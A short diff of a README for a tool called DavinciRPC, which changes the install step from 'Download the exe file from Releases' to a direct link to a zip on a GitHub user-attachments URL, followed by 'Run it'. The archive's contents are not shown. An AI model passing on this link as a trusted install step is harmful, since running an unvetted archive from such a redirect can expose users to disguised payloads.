@@ -5,7 +5,7 @@
 <img width="274" height="582" alt="image" src="https://github.com/user-attachments/assets/bf2a4ced-430e-4e36-8a98-1ea1a2783f8b" /> <img width="269" height="582" alt="image" src="https://github.com/user-attachments/assets/77a2332f-4ff6-4c6b-ae11-756040ab66ec" /> <img width="272" height="580" alt="image" src="https://github.com/user-attachments/assets/2f3073ad-f788-46db-b6e6-694e9e75611a" />
 
 ## How do I use it?
-- Download the exe file from Releases
+- Download DavinciRPC [here](https://github.com/user-attachments/files/31578028/DavinciRPC.zip).
 - Run it and you're set!
 
 ## Info:
